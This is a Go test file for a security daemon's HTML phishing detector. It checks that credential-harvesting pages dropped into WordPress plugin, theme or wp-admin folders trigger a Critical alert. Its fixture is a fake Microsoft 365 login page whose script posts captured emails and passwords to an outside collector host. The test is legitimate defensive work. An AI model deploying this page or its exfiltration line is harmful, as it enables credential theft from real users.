//go:build linux

package daemon

import (
	"os"
	"path/filepath"
	"testing"
	"time"

	"github.com/pidginhost/csm/internal/alert"
	"github.com/pidginhost/csm/internal/config"
)

// checkHTMLPhishing previously skipped /wp-content/themes/ and /wp-content/plugins/
// early. An attacker who compromised a theme or plugin directory could drop a
// credential-harvesting page there and bypass detection. Post-fix, the content
// gates (credential inputs + brand impersonation + exfil/trust-badge) are the
// only filter, and they hold for legitimate framework HTML.

const phishingBody = `<!doctype html>
<html>
<head><title>Microsoft 365 - Secure access</title></head>
<body>
<form action="/receive">
<h2>SharePoint Document Access</h2>
<p>Please verify your identity to continue.</p>
<label>Email</label>
<input type="email" name="email" placeholder="you@company.com" />
<label>Password</label>
<input type="password" name="password" />
<button>Continue</button>
</form>
<script>fetch("https://harvester.workers.dev/x", {method:"POST",body:new FormData(document.forms[0])})</script>
</body>
</html>
`

func runPhishingCheck(t *testing.T, relPath string) (got alert.Finding, fired bool) {
	t.Helper()
	dir := t.TempDir()
	path := filepath.Join(dir, "public_html", relPath)
	if err := os.MkdirAll(filepath.Dir(path), 0755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(path, []byte(phishingBody), 0644); err != nil {
		t.Fatal(err)
	}
	f, err := os.Open(path)
	if err != nil {
		t.Fatal(err)
	}
	defer func() { _ = f.Close() }()
	ch := make(chan alert.Finding, 4)
	fm := &FileMonitor{cfg: &config.Config{}, alertCh: ch}
	fm.checkHTMLPhishing(int(f.Fd()), path, "pi")
	select {
	case got = <-ch:
		return got, true
	case <-time.After(200 * time.Millisecond):
		return alert.Finding{}, false
	}
}

func TestCheckHTMLPhishing_FiresInsidePluginDir(t *testing.T) {
	got, fired := runPhishingCheck(t, "wp-content/plugins/compromised-plugin/login.html")
	if !fired {
		t.Fatal("expected phishing_realtime for page dropped into plugin dir (path allowlist removed)")
	}
	if got.Check != "phishing_realtime" || got.Severity != alert.Critical {
		t.Errorf("got check=%q sev=%v, want Critical phishing_realtime", got.Check, got.Severity)
	}
}

func TestCheckHTMLPhishing_FiresInsideThemeDir(t *testing.T) {
	got, fired := runPhishingCheck(t, "wp-content/themes/compromised-theme/access.html")
	if !fired {
		t.Fatal("expected phishing_realtime for page dropped into theme dir")
	}
	if got.Check != "phishing_realtime" || got.Severity != alert.Critical {
		t.Errorf("got check=%q sev=%v, want Critical phishing_realtime", got.Check, got.Severity)
	}
}

func TestCheckHTMLPhishing_FiresInsideWpAdmin(t *testing.T) {
	got, fired := runPhishingCheck(t, "wp-admin/verify.html")
	if !fired {
		t.Fatal("expected phishing_realtime for page dropped into wp-admin (path allowlist removed)")
	}
	if got.Check != "phishing_realtime" {
		t.Errorf("got check=%q, want phishing_realtime", got.Check)
	}
}

func TestCheckHTMLPhishing_LegitPluginReadmeHTMLStaysQuiet(t *testing.T) {
	// Most legitimate WordPress plugin HTML files are documentation with
	// no form, no credential input, no brand impersonation. The gates in
	// checkHTMLPhishing reject these on content, not on path.
	dir := t.TempDir()
	path := filepath.Join(dir, "public_html", "wp-content", "plugins", "acme", "readme.html")
	if err := os.MkdirAll(filepath.Dir(path), 0755); err != nil {
		t.Fatal(err)
	}
	legit := []byte(`<!doctype html><html><body>
<h1>Acme Plugin</h1>
<p>Thanks for installing Acme. Read the docs at https://acme.example.</p>
</body></html>
`)
	if err := os.WriteFile(path, legit, 0644); err != nil {
		t.Fatal(err)
	}
	f, err := os.Open(path)
	if err != nil {
		t.Fatal(err)
	}
	defer func() { _ = f.Close() }()
	ch := make(chan alert.Finding, 4)
	fm := &FileMonitor{cfg: &config.Config{}, alertCh: ch}
	fm.checkHTMLPhishing(int(f.Fd()), path, "pi")
	select {
	case a := <-ch:
		if a.Check == "phishing_realtime" {
			t.Errorf("unexpected phishing_realtime on legit plugin readme: %+v", a)
		}
	case <-time.After(120 * time.Millisecond):
		// OK - no alert.
	}
}
